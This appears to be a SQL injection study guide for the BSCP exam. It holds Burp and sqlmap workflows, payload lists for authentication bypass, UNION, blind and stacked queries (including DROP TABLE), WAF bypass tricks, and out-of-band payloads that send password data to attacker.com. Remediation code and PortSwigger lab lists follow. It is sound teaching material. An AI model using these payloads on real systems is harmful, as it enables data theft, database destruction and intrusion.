SQL Injection

Execute arbitrary SQL commands by breaking out of a query and injecting malicious code.

Critical BSCP Exam Topic Difficulty: Intermediate

Real-World Analogy

Bouncer Check-In

Imagine a nightclub bouncer checking a guest list. When you arrive, you say your name. The bouncer checks: "Is 'Alice' on the list?" If yes, you enter. But what if you say: "Alice OR everyone is approved"? The bouncer reads it as: "Is 'Alice' on the list OR is everyone on the list?" · the second part is always true, so you get in without being on the actual list. SQL injection works exactly the same way: you add logic that makes the condition always true, bypassing security.

⚡ Day 2 · Initial Probe (Don't Go Deep Yet)

On Day 2, send a single quote ' to every parameter you can find · URL params, POST body, JSON fields, HTTP headers (User-Agent, Referer, X-Forwarded-For), cookie values, search boxes, login forms. You're looking for a signal: an SQL error message, a 500 response, or a noticeably different response. Mark it, document the request number in Burp, and move on. Do not spend more than a minute per parameter on Day 2.

Input probes to send on Day 2:

'                          → SQL error? 500 response?
1 AND 1=1                  → compare with: 1 AND 1=2
1' AND SLEEP(5)-- -        → does the response take 5s longer?
🎯 Day 4 · Deep Dive (Full Exploitation)

Return to every parameter flagged on Day 2. Now go full depth: determine the injection type (error-based, union, blind boolean, blind time), enumerate the database structure, and extract data. Use sqlmap for confirmed injection points. Always try OOB (out-of-band) if blind: use Burp Collaborator or interactsh to confirm via DNS lookup.

# Confirmed SQLi  · full automation
sqlmap -r request.txt --level 5 --risk 3 --batch --dbs

# OOB via DNS (MSSQL)
'; EXEC master..xp_dirtree '\\YOUR.interactsh.com\a'-- -

# OOB (Oracle)
'||(SELECT UTL_HTTP.REQUEST('http://YOUR.interactsh.com/'||user) FROM dual)||'

Chain it: SQLi with file-read privilege → read app config → find hardcoded creds. SQLi on MSSQL with xp_cmdshell → RCE.

How It Works

SQL injection occurs when user input is concatenated directly into a SQL query without proper parameterization. The database interprets the injected text as valid SQL commands, allowing an attacker to read, modify, or delete data.

Vulnerable Code Example

# Python (vulnerable  · DO NOT USE)
username = request.args.get('user')
query = "SELECT * FROM users WHERE username = '" + username + "'"
result = db.execute(query)

If an attacker submits admin' -- as the username, the query becomes:

SELECT * FROM users WHERE username = 'admin' --'

The -- comments out the rest of the query, including the final quote, bypassing authentication.

Why It's Dangerous

SQL injection provides direct access to the database. An attacker can:

  • Extract sensitive data (passwords, personal information, API keys)
  • Modify or delete records
  • Bypass authentication and authorization checks
  • Escalate privileges in the database
  • In some cases, execute operating system commands on the database server

Where to Look

Test any endpoint that accepts user input and communicates with a database. SQL injection isn't limited to GET parameters · it hides in many places:

Common Injection Points

  • Login Forms: Username and password fields (authentication bypass)
  • Search Boxes: Product search, user search, content filtering
  • Sorting/Ordering: The sort or order parameter
  • Filter Parameters: Date ranges, price ranges, status filters
  • JSON Request Bodies: API endpoints accepting JSON (often overlooked)
  • HTTP Headers: User-Agent, X-Forwarded-For, Referer, X-Original-IP
  • Cookies: Session cookies, tracking cookies, authentication tokens
  • File Upload Names: Filename parameter in upload forms

What to Look For in Responses

  • Error Messages: SQL syntax errors revealing table/column names: "Unexpected token near 'WHERE'"
  • Timing Differences: Response takes 5+ seconds longer with SLEEP(5) injected
  • Data Changes: Boolean responses (valid/invalid user) differ based on true/false condition
  • Out-of-Band Channels: DNS queries or HTTP requests triggered by injected code

Burp Suite Workflow

1
Capture the Request

Use Burp Proxy (listening on 127.0.0.1:8080) to intercept HTTP requests. Right-click on a request and send it to Repeater. Target any input parameter (GET, POST, headers, JSON body).

2
Test for SQLi Syntax

In Repeater, modify the parameter with a single quote: test'. Send the request. Look for SQL syntax errors in the response. Example error: "SQL error: Unterminated string literal" · this confirms the input reaches SQL.

3
Craft a Working Payload

Try logical operators: test' OR '1'='1. If the response changes (returns data when it shouldn't, or doesn't filter), the injection works. Test with both -- and # for comment syntax to close the query.

4
Identify Injection Type

Determine if the database shows errors (error-based), has exploitable true/false responses (blind boolean), takes longer with delays (blind time-based), or responds out-of-band (DNS exfiltration).

5
Use SQLMap for Automation

Once confirmed, use sqlmap to automate extraction. Save the request from Burp (right-click → Copy to file) and run: sqlmap -r request.txt --dbs --batch

6
Enumerate and Extract

Use sqlmap to list tables (--tables), dump specific tables (-T users --dump), or escalate privileges. Save findings for the report.

Payloads & Techniques

Authentication Bypass

Login forms are the easiest target. The query often looks like:

SELECT * FROM users WHERE username='INPUT1' AND password='INPUT2'

Inject in the username field:

' OR '1'='1' --
admin' --
admin' #
admin' OR 1=1 --
' OR 'x'='x

The query becomes: SELECT * FROM users WHERE username='admin' --' AND password='...' · the condition is always true, and the password check is ignored.

UNION-Based Injection

Extract data directly from visible query results. First, determine the number of columns:

' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
(repeat until you get an error)

Once you know the column count (e.g., 3 columns), use UNION:

' UNION SELECT 1,2,3 --
' UNION SELECT 1,2,database() --
' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --
' UNION SELECT 1,2,group_concat(CONCAT(username,':',password)) FROM users --

Error-Based Injection

Force errors to leak information in error messages:

' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS CHAR) --
' AND EXTRACTVALUE(1,CONCAT('~',(SELECT database()))) --
' OR 1=CAST((SELECT version()) AS UNSIGNED) --

Blind Boolean-Based Injection

No visible data returned, but behavior differs based on true/false conditions:

' AND (SELECT COUNT(*) FROM users) > 0 --
' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) = 'a' --
' AND SLEEP(0) --  (fast response = true)
' AND SLEEP(5) --  (slow response = false)

Blind Time-Based Injection

Inject delay functions; response time indicates true/false:

MySQL:    ' OR SLEEP(5) --
PostgreSQL: ' OR pg_sleep(5) --
MSSQL:     ' WAITFOR DELAY '00:00:05' --
Oracle:    ' AND (SELECT DBMS_LOCK.SLEEP(5) FROM dual) --

To extract data one character at a time:

' OR IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) --

Stacked Queries (MSSQL, PostgreSQL)

Some databases allow multiple SQL statements separated by semicolons:

'; DROP TABLE users; --
'; UPDATE users SET admin=1 WHERE username='attacker'; --

Out-of-Band Exfiltration (DNS)

Trigger DNS requests containing data. Requires setting up a DNS server you control or using Burp Collaborator:

MySQL:     ' OR LOAD_FILE('\\\\attacker.com\\share\\test') --
MSSQL:     '; EXEC xp_dirtree '\\attacker.com\share' --
Oracle:    ' OR UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users)) --

WAF Bypass Techniques

Comment Variations

Different comment syntaxes bypass filters checking for --:

-- (SQL standard, but MSSQL/MySQL require space after)
-- -  (space and dash)
#    (MySQL comment)
/**/  (C-style comment)
/*!50000 ... */  (MySQL version-specific comment)

Case Mixing

Some WAFs match exact case:

' OR '1'='1
' Or '1'='1
' oR '1'='1
' OR 1=1 --
' or 1=1 #

Whitespace and Encoding

%20 (URL-encoded space)
%09 (tab)
%0A (newline)
' OR(1=1)--
'OR(1)--

Keyword Splitting

Inject keywords with interrupting characters, then use comments to remove them:

' /*!50000OR*/ '1'='1
' UNI/**/ON SELECT
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --

Double Encoding

If the app decodes twice:

%252527  (URL-encoded '%27' which decodes to single quote)

MySQL-Specific Tricks

' UNION SELECT 1,2,3 LIMIT 1 OFFSET 0 --
' UNION SELECT 1,2,@@version --  (get version)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 --

String Concatenation

Break up dangerous keywords:

MySQL:     CONCAT('SEL','ECT')
MSSQL:     'SEL'+'ECT'
Oracle:    'SEL'||'ECT'
PostgreSQL: 'SEL'||'ECT'

Exploitation & Impact

SQLMap Command Reference

Once you've confirmed SQLi, use sqlmap for efficient exploitation:

Extract Databases

sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

Dump Specific Database Tables

sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

Extract All Data

sqlmap -u "http://target.com/page.php?id=1" --dump-all --batch

From Request File (Burp Export)

sqlmap -r request.txt --dbs --batch
sqlmap -r request.txt --level 5 --risk 3 --dump-all

Test Specific Parameter

sqlmap -u "http://target.com/page.php?id=1&name=test" -p name --dbs

Real-World Exploitation Scenarios

Scenario 1: Extract User Credentials

A vulnerable login form leaks usernames and password hashes. Extract the users table and crack hashes offline using Hashcat.

Scenario 2: Authentication Bypass

Use admin' -- to bypass login without knowing the password. Access admin panel and modify user roles, delete accounts, or escalate privileges.

Scenario 3: Data Exfiltration

Dump all customer records (names, emails, phone numbers, payment info). Sell data or use for phishing campaigns.

Scenario 4: Write a Web Shell

On MySQL with FILE privileges, use INTO OUTFILE to write PHP files to the web directory. Access the shell for remote code execution.

Scenario 5: Privilege Escalation in Database

Extract or reset database user passwords to gain administrative access. Backup the database or modify system tables for persistence.

Remediation

Parameterized Queries (Prepared Statements)

The gold standard. Separates SQL code from user data, preventing injection:

Python (sqlite3)

import sqlite3
conn = sqlite3.connect('database.db')
cursor = conn.cursor()

# VULNERABLE
username = request.args.get('user')
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

# SAFE - Use placeholders
username = request.args.get('user')
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
result = cursor.fetchall()

Python (psycopg2 for PostgreSQL)

import psycopg2
conn = psycopg2.connect("dbname=mydb user=myuser")
cursor = conn.cursor()

# SAFE
username = request.args.get('user')
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
result = cursor.fetchall()

PHP (PDO)

$pdo = new PDO('mysql:host=localhost;dbname=mydb', 'user', 'pass');

// VULNERABLE
$username = $_GET['user'];
$stmt = $pdo->query("SELECT * FROM users WHERE username = '$username'");

// SAFE - Use prepared statements
$username = $_GET['user'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
$result = $stmt->fetchAll();

Java (JDBC PreparedStatement)

String username = request.getParameter("user");

// VULNERABLE
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// SAFE
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
ResultSet rs = pstmt.executeQuery();

Input Validation

Validate and sanitize input before use:

  • Whitelist: Only allow known-good characters (e.g., usernames as alphanumeric only)
  • Type Checking: Ensure IDs are integers, emails match a pattern
  • Length Limits: Enforce maximum input length
  • Reject Suspicious Patterns: Block inputs containing ' OR -- # /*

Principle of Least Privilege

Database users should have minimal required permissions:

  • Web application user: SELECT, INSERT, UPDATE (no DROP, no FILE access)
  • Admin/backup user: Full permissions, used only for maintenance
  • Read-only user: SELECT only, for reporting or analytics

Web Application Firewall (WAF)

Use WAF rules to detect and block common SQLi patterns (ModSecurity, Cloudflare, AWS WAF). Layer with parameterized queries · WAF alone is insufficient.

Security Testing

  • Include SQLi testing in your CI/CD pipeline with tools like sqlmap
  • Perform code reviews focusing on database query construction
  • Run static analysis tools (SAST) that flag unsanitized user input in queries

PortSwigger Labs

PortSwigger Academy provides 18 SQL injection labs across three difficulty levels:

Apprentice (Beginner)

  • SQL injection vulnerability in WHERE clause allowing retrieval of hidden data: Basic UNION-based SQLi to extract data from another table
  • SQL injection vulnerability allowing login bypass: Bypass login with admin' --
  • SQL injection UNION attack, determining the number of columns returned by the query: Use ORDER BY to find column count, then UNION
  • SQL injection UNION attack, finding a column containing text: Identify which column can return string data
  • SQL injection UNION attack with a database table in a different database: Extract from information_schema or other databases

Practitioner (Intermediate)

  • SQL injection vulnerability in the WHERE clause allowing conditional retrieval of hidden data: Blind boolean-based SQLi
  • Blind SQL injection with conditional responses: Extract data using IF conditions
  • Blind SQL injection with time delays: Use SLEEP() or equivalent to confirm blind SQLi
  • Blind SQL injection with time delays and information retrieval: Extract data character-by-character with timing
  • Blind SQL injection with conditional errors: Trigger errors to leak information
  • Extracting sensitive data via SQL error messages: Use CAST() or other functions to force detailed errors

Expert (Advanced)

  • Second-order SQL injection: Inject in one field, trigger execution in another request
  • SQL injection in different parts of the query: Injections in SELECT, INSERT, UPDATE, DELETE statements
  • Stacked queries: Execute multiple SQL statements (MSSQL/PostgreSQL)
  • Time-based blind SQL injection · character-by-character extraction: Automate data exfiltration
  • Out-of-band (OAST) data exfiltration: Use DNS or HTTP callbacks to extract data
  • SQL injection with filter evasion: Bypass WAF rules and input sanitization

Common Beginner Mistakes

Mistake #1: Only Testing GET Parameters

Beginners often test only URL parameters and forget POST bodies, JSON APIs, headers, and cookies. SQLi exists everywhere user input reaches SQL. Always test ALL input channels.

Mistake #2: Forgetting JSON Body Parameters

Modern APIs accept JSON in request bodies. Many testers overlook these. Use Burp Repeater to test JSON fields with SQL payloads. Example: {"username": "' OR '1'='1", "password": "test"}

Mistake #3: Not Trying Different Comment Syntaxes

A payload with -- might fail, but # works. Try both --, #, and /**/. Also try -- - (with a space after dashes).

Mistake #4: Giving Up After First Failure

A single quote might not trigger an error. Try: ' OR '1'='1, then ") OR ("1"="1, then ) OR (1=1. Different quotes and escaping levels exist. Persist.

Mistake #5: Ignoring Second-Order SQLi

Your payload doesn't execute immediately · it's stored and executed when an admin views it. Inject in comment fields, profile names, etc. Then wait for a privileged user to trigger the payload.

Mistake #6: Testing Only String Inputs

Numeric parameters (IDs, ages, prices) are also injectable. Try: ?id=1' OR '1'='1 and ?id=1 OR 1=1 -- (without quotes). The query might not use quotes around the number.

Mistake #7: Running sqlmap Without Understanding the Result

sqlmap is powerful but blindly running it might miss vulnerable parameters or misidentify the database type. Always manually confirm SQLi first, then use sqlmap to automate extraction.

Mistake #8: Not Checking HTTP Headers

User-Agent, X-Forwarded-For, Referer, and custom headers often reach SQL queries (for logging, IP blocking, etc.). Include them in your testing strategy.

🔗 See Also · Attack Chains

SQL Injection is often chained with other vulnerabilities or found in apps that have related issues.

💻 Command Injection MSSQL xp_cmdshell turns SQLi into RCE. Same root cause: unsanitized input in a query. 📝 SSTI Both are injection vulnerabilities. Apps vulnerable to SQLi often have loose input handling elsewhere. 🚪 IDOR SQLi gives DB access; IDOR gives object access. Together they expose all data in the system. 🍃 NoSQL Injection Same concept, different database. If you find SQLi, check if any endpoints use a NoSQL DB too.
